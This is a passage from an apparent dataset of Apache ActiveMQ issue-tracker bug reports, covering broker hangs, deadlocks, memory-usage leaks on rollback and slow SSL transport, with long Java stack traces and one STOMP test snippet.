jolokia-agent is barfing an ugly exception on the console on activemq startup:  WARN | jolokia-agent: Cannot start discovery multicast handler: java.net.SocketException: Can"t assign requested addressjava.net.SocketException: Can"t assign requested address at java.net.PlainDatagramSocketImpl.join(Native Method) at java.net.AbstractPlainDatagramSocketImpl.joinGroup(AbstractPlainDatagramSocketImpl.java:202) at java.net.MulticastSocket.joinGroup(MulticastSocket.java:402) at org.jolokia.discovery.MulticastUtil.joinMcGroupsOnAllNetworkInterfaces(MulticastUtil.java:136) at org.jolokia.discovery.MulticastUtil.newMulticastSocket(MulticastUtil.java:38) at org.jolokia.discovery.MulticastSocketListenerThread.<init>(MulticastSocketListenerThread.java:60) at org.jolokia.discovery.DiscoveryMulticastResponder.start(DiscoveryMulticastResponder.java:75) at org.jolokia.http.AgentServlet.initDiscoveryMulticast(AgentServlet.java:176) at org.jolokia.http.AgentServlet.init(AgentServlet.java:162) at org.eclipse.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:477)
issueID:AMQ-5125
type:Bug
changed files:
texts:Broker and clients hang
JMS clients start to hang after a while in calls such as session.createObjectMessage(). Both the broker and the hanging clients can"t be easily shut down when this happens - only forcefully applied kill"s do the job.I"m using queues and transactional sessions. All clients (producers and consumers) are in the same Java VM. There is only one JMS connection between the application and the broker. Each client has its own session, but they all share the same connection.Normally, the data directory of the LevelDb contains only a few log files. But in my case, the number of log files is steadily increasing.Furthermore, I was able to track down the issue to following circumstance: The problem only occurs, when consumers do a rollback instead of a commit when they receive the message. The rollback / redelivery works as expected - the same message is received again after a previous rollback.As far as I can tell, the problem does not occur with KahaDb.I"ll attach a test program that provokes the error. It sets up a few hundred queues, consumers and producers. The consumers just receive the message and commit the session, but they also do "random" rollbacks. It can be observed immediately that the number of files starts increasing in the data directory. After a few minutes, the clients hang - sometimes sooner, sometimes later. I"ll also attach the config file for the broker.I am aware, that heavy rollbacking should not happen in normal operation. But from a long term stability perspective, this is a blocker for us.
issueID:AMQ-5126
type:Bug
changed files:
texts:OnePrefetchAsyncConsumerTest fails intermittently
OnePrefetchAsyncConsumerTest.testPrefetchExtension() fails intermittently, about 1 out of every 3 times on my laptop.  When it fails it"s because the session.commit() in TestServerSession.run().start() never returns and subsequently the test does not receive the second and third messages.I"ll attach a log of when the test fails, and also add an @Ignore for now.
issueID:AMQ-5127
type:Bug
changed files:
texts:MQTT Subscriber with QoS.EXACTLY_ONCE receives messages even after unsubscribing from topic
How to reproduce:1. client c1 ( clientid1) connects, subscribes to topic A with QoS.EXACTLY_ONCE , unsubscribes topic A and disconnects.2. client c2 ( clientid2) publishes to topic A with QoS.EXACTLY_ONCE.3. client c1 ( clientid1) connects back again.Expectation : client c1 shouldn"t receive any messages as it has already unsubscribedAttached test method to reproduce this issue
issueID:AMQ-5128
type:Bug
changed files:
texts:Provide SSL_OPTS to all tasks in shell scripts
Currently SSL_OPTS are not always being passed to the activemq-admin (and activem) script tasks. We need those so we can browse queues over SSL for example.
issueID:AMQ-5131
type:Bug
changed files:
texts:Add proton META_INF/services to the activemq-osgi bundle definition so AMQP works inside Karaf
None
issueID:AMQ-5135
type:Test
changed files:
texts:Add roundrip amqp send/receive sanity to karaf-itest for osgi validation
We need to verify an amqp client/broker send/receive roundtrip in karaf
issueID:AMQ-5136
type:Bug
changed files:
texts:MemoryUsage is not decremented on a JMS topic when rolling back a transacted session
When sending a message to a topic using a transacted session, memory usage is not decremented correctly when session.rollback is called. It is decremented on commit but not on rollback. This has quite bad consequences since after some time depending on the system memory usage settings and amount of rolled back messages, the broker starts to reject messages saying that Usage Manager memory limit is reached. The only solution is to restart the broker.I created a small Maven project (see the attachment) with a unit test starting an embedded broker and two test methods: one sending messages with session.commit and another with session.rollback(). The last one fails to assert the memory usage. In the output one can see quite a lot of error logs written by ActiveMQ. The problem is reproducible with 5.8.0 and 5.9.0.The problem seems to be in org.apache.activemq.broker.region.Topic#doMessageSend method where a transaction synchronization is registered. In the transaction synchronization only afterCommit is supplied, but no afterRollback. So there seems to be nobody calling message.decrementReferenceCount().
issueID:AMQ-5138
type:Bug
changed files:VMTransport.java
texts:Useless code in VMTransport class
In VMTransport class taskRunner is set to null two times needlessly on the next line and couple of lines below:           taskRunner = null;            messageQueue = null;            if (mq != null) {                mq.clear();            }            // Allow pending deliveries to finish up, but don"t wait            // forever in case of an stalled onCommand.            if (tr != null) {                try {                    tr.shutdown(TimeUnit.SECONDS.toMillis(1));                } catch(Exception e) {                }                taskRunner = null;            }
issueID:AMQ-514
type:Improvement
changed files:
texts:add a broker name property to ActiveMQConnection
None
issueID:AMQ-5140
type:Bug
changed files:
texts:ArithmeticException: / by zero in HealthView.healthList() when using JMX-Health-Operations
Using hawtio, navigate to activeMQ, select Health in Tree, then Operations.Both operations Health() and Health list() lead to the exception, although in the attributes section everything is fine!?Status: Good java.lang.ArithmeticException: / by zero at org.apache.activemq.broker.jmx.HealthView.healthList(HealthView.java:158) at org.apache.activemq.broker.jmx.HealthView.health(HealthView.java:51) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at sun.reflect.misc.Trampoline.invoke(Unknown Source) at sun.reflect.GeneratedMethodAccessor17.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at sun.reflect.misc.MethodUtil.invoke(Unknown Source) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(Unknown Source) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(Unknown Source) at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(Unknown Source) at com.sun.jmx.mbeanserver.PerInterface.invoke(Unknown Source) at com.sun.jmx.mbeanserver.MBeanSupport.invoke(Unknown Source) at javax.management.StandardMBean.invoke(Unknown Source) at org.apache.activemq.broker.jmx.AnnotatedMBean.invoke(AnnotatedMBean.java:198) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(Unknown Source) at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(Unknown Source) at org.jolokia.handler.ExecHandler.doHandleRequest(ExecHandler.java:98) at org.jolokia.handler.ExecHandler.doHandleRequest(ExecHandler.java:40) at org.jolokia.handler.JsonRequestHandler.handleRequest(JsonRequestHandler.java:89) at org.jolokia.backend.MBeanServerExecutorLocal.handleRequest(MBeanServerExecutorLocal.java:109) at org.jolokia.backend.MBeanServerHandler.dispatchRequest(MBeanServerHandler.java:102) at org.jolokia.backend.LocalRequestDispatcher.dispatchRequest(LocalRequestDispatcher.java:98) at org.jolokia.backend.BackendManager.callRequestDispatcher(BackendManager.java:409) at org.jolokia.backend.BackendManager.handleRequest(BackendManager.java:158) at org.jolokia.http.HttpRequestHandler.executeRequest(HttpRequestHandler.java:197) at org.jolokia.http.HttpRequestHandler.handlePostRequest(HttpRequestHandler.java:137) at org.jolokia.http.AgentServlet$2.handleRequest(AgentServlet.java:399) at org.jolokia.http.AgentServlet.handle(AgentServlet.java:287) at org.jolokia.http.AgentServlet.doPost(AgentServlet.java:256) at javax.servlet.http.HttpServlet.service(HttpServlet.java:713) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1329) at io.hawt.web.AuthenticationFilter$2.run(AuthenticationFilter.java:143) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Unknown Source) at io.hawt.web.AuthenticationFilter.executeAs(AuthenticationFilter.java:140) at io.hawt.web.AuthenticationFilter.doFilter(AuthenticationFilter.java:108) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300) at io.hawt.web.CORSFilter.doFilter(CORSFilter.java:42) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300) at org.ops4j.pax.web.service.internal.WelcomeFilesFilter.doFilter(WelcomeFilesFilter.java:193) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445) at org.ops4j.pax.web.service.jetty.internal.HttpServiceServletHandler.doHandle(HttpServiceServletHandler.java:70) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:534) at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:227) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1038) at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doHandle(HttpServiceContext.java:117) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:374) at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:189) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:972) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135) at org.ops4j.pax.web.service.jetty.internal.JettyServerHandlerCollection.handle(JettyServerHandlerCollection.java:75) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116) at org.eclipse.jetty.server.Server.handle(Server.java:363) at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:483) at org.eclipse.jetty.server.AbstractHttpConnection.content(AbstractHttpConnection.java:931) at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.content(AbstractHttpConnection.java:992) at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:856) at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:240) at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82) at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:627) at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:51) at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608) at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543) at java.lang.Thread.run(Unknown Source)
issueID:AMQ-5141
type:Bug
changed files:
texts:Message expiry that is done as part of a removeSubscription command should not use the clients credentials.
If the broker handles a RemoveInfo command it may also kick off a message expiry check for (I presume) any prefetched messages. If messages are to be expired they get sent to ActiveMQ.DLQ by default. See stack trace in next comment.If the broker is security enabled with authorization turned on and messages get sent to DLQ as a result of the expiry check then the broker uses the client"s security context when sending the messages to DLQ. This implies the client user needs to have write access to ActiveMQ.DLQ. As this may happen with any other client, all client users will require write access to ActiveMQ.DLQ, which may not be appropriate from a security point of view. The broker regularly runs an expiry check and uses a broker internal security context for this task. In my opinion this same broker internal security context should be used when expiring messages as part of the RemoveInfo command. The broker should not use the client"s security context. &#91;1&#93;The current behavior can raise the following SecurityException if the client user does not have write access to ActiveMQ.DLQ2014-04-11 08:11:22,229 | WARN  | 2.38:61201@61616 | RegionBroker | ivemq.broker.region.RegionBroker  703 | 105 - org.apache.activemq.activemq-osgi - 5.8.0.redhat-60024 | Caught an exception sending to DLQ: Message ID:S930A3085-50865-635327964441522304-1:1:363:2:1 dropped=false acked=false locked=truejava.lang.SecurityException: User Test is not authorized to write to: queue://ActiveMQ.DLQ at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:197)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.util.BrokerSupport.doResend(BrokerSupport.java:68)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.util.BrokerSupport.resendNoCopy(BrokerSupport.java:38)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.RegionBroker.sendToDeadLetterQueue(RegionBroker.java:691)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:262)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:262)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.advisory.AdvisoryBroker.sendToDeadLetterQueue(AdvisoryBroker.java:413)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:262)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:262)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.MutableBrokerFilter.sendToDeadLetterQueue(MutableBrokerFilter.java:274)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.util.RedeliveryPlugin.sendToDeadLetterQueue(RedeliveryPlugin.java:132)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:262)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.sendToDeadLetterQueue(BrokerFilter.java:262)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.MutableBrokerFilter.sendToDeadLetterQueue(MutableBrokerFilter.java:274)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.RegionBroker.messageExpired(RegionBroker.java:659)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.advisory.AdvisoryBroker.messageExpired(AdvisoryBroker.java:283)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.MutableBrokerFilter.messageExpired(MutableBrokerFilter.java:269)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.MutableBrokerFilter.messageExpired(MutableBrokerFilter.java:269)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1671)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:648)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:162)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.Queue.doActualDispatch(Queue.java:1907)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.Queue.doDispatch(Queue.java:1834)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:576)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:380)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:364)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.jmx.ManagedRegionBroker.removeConsumer(ManagedRegionBroker.java:247)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:253)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:123)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:117)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:123)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:651)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:76)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)[105:org.apache.activemq.activemq-osgi:5.8.0.redhat-60024] at java.lang.Thread.run(Unknown Source)[:1.6.0_26]
issueID:AMQ-5144
type:Bug
changed files:NIOOutputStream.java
texts:stomp+nio+ssl very slow message sending
Hi there I have following broker config:  <transportConnector name="stomp" uri="stomp+nio+ssl://0.0.0.0:61612?maximumConnections=10000&wireFormat.maxFrameSize=104857600"/>ACTIVEMQ_OPTS_MEMORY="-Xms1G -Xmx2G -Dorg.apache.activemq.UseDedicatedTaskRunner=false"And followind code snippet: @Test  public void plainStompTest() throws Exception {    StompConnection sender = new StompConnection();    StompConnection receiver = new StompConnection();    System.setProperty("javax.net.ssl.keyStore", "/home/user/.keystore/client.ks");    System.setProperty("javax.net.ssl.trustStore", "/home/user/.keystore/client.ts");    System.setProperty("javax.net.ssl.keyStorePassword", "changeme");    System.setProperty("javax.net.ssl.trustStorePassword", "changeme");    SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();    SSLSocket sslsocket1 = (SSLSocket) factory.createSocket("localhost", 61612);    SSLSocket sslsocket2 = (SSLSocket) factory.createSocket("localhost", 61612);    sender.open(sslsocket1);    receiver.open(sslsocket2);    sender.connect("admin", "admin");    receiver.connect("admin", "admin");    receiver.subscribe("/queue/receiver");    Thread.sleep(1000); // wait until subscribed    char[] data = new char[toSendBytesMsgSize];    Arrays.fill(data, "a");    long startTime = System.currentTimeMillis();    logger.info("Sending message - size " + toSendBytesMsgSize / 1024 + " kb");    sender.send("/queue/receiver", new String(data));    StompFrame frame = receiver.receive(0);    byte[] body = frame.getBody().getBytes();    long stopTime = System.currentTimeMillis();    long elapsedTime = stopTime - startTime;    logger.info("Reply received");    logger.info("Execution time = " + elapsedTime / 1000 + " seconds" + "[" + elapsedTime + " ms]");    assertEquals(toSendBytesMsgSize, body.length);  }Results for stomp+ssl : Sending message - size 1000 kbReply received Execution time = 0 seconds[221 ms]Results for stomp+nio :  (i modified test client to not use ssl socket)Sending message - size 1000 kbReply received Execution time = 0 seconds[399 ms]Results for stomp+nio+ssl : Sending message - size 1000 kbReply receivedExecution time = 54 seconds[54162 ms]So from above we see that for stomp+nio+ssl it takes very long time to send a message. Anyone knows whats wrong ?
issueID:AMQ-5146
type:Bug
changed files:
texts:RedeliveryPolicy exceeded for crashing consumer
A consumer with a transacted session that dies after receive or in onMessage (due to some of the message content for example), but before the a transaction can complete will continue to receive the message.The connection will die, the transaction will rollback, the broker will increment the redeliveryCounter and redispatch the message.However the redeliveryPolicy, which is only checked on rollback (client side) will never kick in.the result is infinite redelivery with an ever incrementing redeliveryCounter.It is a reasonable expectation that this message would eventually find its way into the dlq.The broker redelivery plugin does not help because it is triggered by the client side poison ack. Either the broker redelivery plugin can get involved before dispatch, or a client can do a predispatch check.
issueID:AMQ-5149
type:Bug
changed files:
texts:Potential deadlock
There"s a potential for deadlock between transaction completion with optimizeDispatch=true and periodic message expiry, while checkpoint is in progress.Contention is over pagedInPendingDispatchLock and checkpointLock.The problem is that we"re expiring messages under the pagedInPendingDispatchLock, so the solution is to change this and use the same pattern as we do with pagedInMessages expiry.Using optimizedDispatch=false or expireMessagesPeriod=0 will workaround the issue.Relevant thread traces"ActiveMQ Journal Checkpoint Worker" daemon prio=10 tid=0x00007f0bb8b9d000 nid=0x169b waiting on condition [0x00007f0ba6e95000]   java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00000000e1c4c4d8> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:867) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1197) at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:945) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1366) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:840) at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:317)ActiveMQ Broker[localhost] Scheduler" daemon prio=10 tid=0x00007f0bbae73800 nid=0x1652 waiting on condition [0x00007f0ba7197000]  java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00000000e1c4c4d8> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireShared(AbstractQueuedSynchronizer.java:964) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireShared(AbstractQueuedSynchronizer.java:1282) at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.lock(ReentrantReadWriteLock.java:731) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:886) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:869) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeMessage(KahaDBStore.java:444) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeAsyncMessage(KahaDBStore.java:416) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.removeAsyncMessage(KahaDBTransactionStore.java:495) at org.apache.activemq.store.kahadb.KahaDBTransactionStore$1.removeAsyncMessage(KahaDBTransactionStore.java:182) at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:850) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1616) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1608) at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1674) at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1664) at org.apache.activemq.broker.region.Queue.doBrowse(Queue.java:1037) at org.apache.activemq.broker.region.Queue.expireMessages(Queue.java:836) at org.apache.activemq.broker.region.Queue.access$100(Queue.java:98) at org.apache.activemq.broker.region.Queue$2.run(Queue.java:138) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:555) at java.util.TimerThread.run(Timer.java:505)"ActiveMQ NIO Worker 76408" daemon prio=10 tid=0x00007f0b98db3800 nid=0x5241 waiting on condition [0x00007f0ba8bb1000]  java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00000000e1c6ff98> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireShared(AbstractQueuedSynchronizer.java:964) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireShared(AbstractQueuedSynchronizer.java:1282) at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.lock(ReentrantReadWriteLock.java:731) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1475) - locked <0x00000000e1c70130> (a java.lang.Object) at org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1709) at org.apache.activemq.broker.region.PrefetchSubscription$2.afterCommit(PrefetchSubscription.java:439) at org.apache.activemq.transaction.Transaction.fireAfterCommit(Transaction.java:117) at org.apache.activemq.transaction.Transaction.doPostCommit(Transaction.java:185) at org.apache.activemq.transaction.Transaction$2.call(Transaction.java:54) at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334) at java.util.concurrent.FutureTask.run(FutureTask.java:166) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1132) at org.apache.activemq.store.kahadb.MessageDatabase$10.visit(MessageDatabase.java:1003) at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:985) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:892) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:869) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:294) at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:85) at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:75) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:263) at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:97) at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:97) at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:97) at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:97) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionTwoPhase(TransportConnection.java:465) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:102) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138) at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:722)
issueID:AMQ-515
type:New Feature
changed files:Topic.java
Queue.java
UsageManager.java
texts:Add option so that producer.send() throws an exception if it would block due to the queue/broker being full.
None
issueID:AMQ-5153
type:Bug
